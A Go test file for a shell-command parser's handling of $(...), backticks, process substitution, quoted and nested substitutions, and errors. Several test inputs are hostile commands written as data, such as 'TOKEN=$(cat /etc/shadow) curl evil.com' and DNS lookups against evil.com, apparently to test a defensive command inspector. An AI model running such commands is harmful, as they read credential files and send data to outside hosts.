package shellparse

import (
	"errors"
	"testing"
)

// ----------------------------------------------------------------------------
// Command substitution $(...)
// ----------------------------------------------------------------------------

func TestSubstCmdSimple(t *testing.T) {
	cmds := mustSplit(t, "curl $(dig +short evil.com)/path")
	cmd := cmds[0]
	if len(cmd.Subst) != 1 {
		t.Fatalf("subst = %v", cmd.Subst)
	}
	s := cmd.Subst[0]
	if s.Kind != "cmd" {
		t.Errorf("kind = %q, want cmd", s.Kind)
	}
	if s.RawBody != "dig +short evil.com" {
		t.Errorf("raw = %q", s.RawBody)
	}
	if len(s.Parsed) != 1 {
		t.Fatalf("parsed = %v", s.Parsed)
	}
	inner := s.Parsed[0]
	expectArgv(t, inner, "dig", "+short", "evil.com")
	if inner.Depth != 1 || inner.Origin != "subshell" {
		t.Errorf("inner depth=%d origin=%q", inner.Depth, inner.Origin)
	}
}

func TestSubstCmdWithSpacesInBody(t *testing.T) {
	// Word splitting would make this 3 separate argv tokens in the
	// tokenizer, but the subst scanner reconstructs and finds one body.
	cmds := mustSplit(t, "echo $(cat /etc/passwd | head -1)")
	cmd := cmds[0]
	if len(cmd.Subst) != 1 {
		t.Fatalf("subst = %v", cmd.Subst)
	}
	if len(cmd.Subst[0].Parsed) != 2 {
		t.Fatalf("inner commands = %v", cmd.Subst[0].Parsed)
	}
}

func TestSubstCmdNested(t *testing.T) {
	// $(echo $(dig evil.com)) - outer body contains inner body
	cmds := mustSplit(t, "curl $(echo $(dig evil.com))")
	cmd := cmds[0]
	if len(cmd.Subst) != 1 {
		t.Fatalf("outer subst = %v", cmd.Subst)
	}
	outer := cmd.Subst[0].Parsed[0]
	// outer body is `echo $(dig evil.com)`: one command "echo" with
	// one $(...) subst inside.
	if len(outer.Subst) != 1 {
		t.Fatalf("outer inner subst = %v", outer.Subst)
	}
	inner := outer.Subst[0].Parsed[0]
	expectArgv(t, inner, "dig", "evil.com")
	if inner.Depth != 2 {
		t.Errorf("inner depth = %d, want 2", inner.Depth)
	}
}

// ----------------------------------------------------------------------------
// Backticks
// ----------------------------------------------------------------------------

func TestSubstBacktick(t *testing.T) {
	cmds := mustSplit(t, "echo `whoami`")
	cmd := cmds[0]
	if len(cmd.Subst) != 1 {
		t.Fatalf("subst = %v", cmd.Subst)
	}
	s := cmd.Subst[0]
	if s.Kind != "backtick" || s.RawBody != "whoami" {
		t.Errorf("s = %+v", s)
	}
	if s.Parsed[0].Origin != "backtick" {
		t.Errorf("origin = %q", s.Parsed[0].Origin)
	}
}

// ----------------------------------------------------------------------------
// Process substitution <(...) >(...)
// ----------------------------------------------------------------------------

func TestSubstProcIn(t *testing.T) {
	cmds := mustSplit(t, "diff <(curl a.com) <(curl b.com)")
	cmd := cmds[0]
	if len(cmd.Subst) != 2 {
		t.Fatalf("subst = %v", cmd.Subst)
	}
	for i, want := range []string{"curl a.com", "curl b.com"} {
		if cmd.Subst[i].Kind != "proc-in" {
			t.Errorf("kind[%d] = %q", i, cmd.Subst[i].Kind)
		}
		if cmd.Subst[i].RawBody != want {
			t.Errorf("raw[%d] = %q", i, cmd.Subst[i].RawBody)
		}
	}
}

func TestSubstProcOut(t *testing.T) {
	cmds := mustSplit(t, "tee >(gzip > a.gz)")
	cmd := cmds[0]
	if len(cmd.Subst) != 1 || cmd.Subst[0].Kind != "proc-out" {
		t.Errorf("subst = %v", cmd.Subst)
	}
}

// ----------------------------------------------------------------------------
// Substitution inside quotes
// ----------------------------------------------------------------------------

func TestSubstInsideDoubleQuote(t *testing.T) {
	// Tokenizer preserves $(...) inside "" as literal text, the subst
	// scanner finds it.
	cmds := mustSplit(t, `curl "$(dig +short evil.com)/path"`)
	cmd := cmds[0]
	if len(cmd.Subst) != 1 {
		t.Fatalf("subst = %v", cmd.Subst)
	}
	inner := cmd.Subst[0].Parsed[0]
	expectArgv(t, inner, "dig", "+short", "evil.com")
}

// ----------------------------------------------------------------------------
// Subst in redirect target
// ----------------------------------------------------------------------------

func TestSubstInRedirectTarget(t *testing.T) {
	// `cat < $(find /tmp -name evil)` - subst appears in redirect target
	cmds := mustSplit(t, "cat < $(find /tmp -name evil)")
	cmd := cmds[0]
	expectArgv(t, cmd, "cat")
	if len(cmd.Redirects) != 1 {
		t.Fatalf("redirects = %v", cmd.Redirects)
	}
	if len(cmd.Subst) != 1 {
		t.Fatalf("subst = %v", cmd.Subst)
	}
}

// ----------------------------------------------------------------------------
// Subst in env assignment
// ----------------------------------------------------------------------------

func TestSubstInEnv(t *testing.T) {
	cmds := mustSplit(t, `TOKEN=$(cat /etc/shadow) curl evil.com`)
	cmd := cmds[0]
	if len(cmd.Env) != 1 {
		t.Fatalf("env = %v", cmd.Env)
	}
	if len(cmd.Subst) != 1 {
		t.Fatalf("subst = %v", cmd.Subst)
	}
}

// ----------------------------------------------------------------------------
// Unbalanced substitution
// ----------------------------------------------------------------------------

func TestSubstUnbalanced(t *testing.T) {
	_, err := SplitString("curl $(dig evil.com")
	if !errors.Is(err, ErrUnbalancedSubst) {
		t.Errorf("err = %v, want ErrUnbalancedSubst", err)
	}
}

func TestSubstEmptyBody(t *testing.T) {
	cmds := mustSplit(t, "echo $()")
	cmd := cmds[0]
	if len(cmd.Subst) != 1 {
		t.Fatalf("subst = %v", cmd.Subst)
	}
	if cmd.Subst[0].RawBody != "" {
		t.Errorf("raw = %q", cmd.Subst[0].RawBody)
	}
	if len(cmd.Subst[0].Parsed) != 0 {
		t.Errorf("parsed = %v, want empty", cmd.Subst[0].Parsed)
	}
}
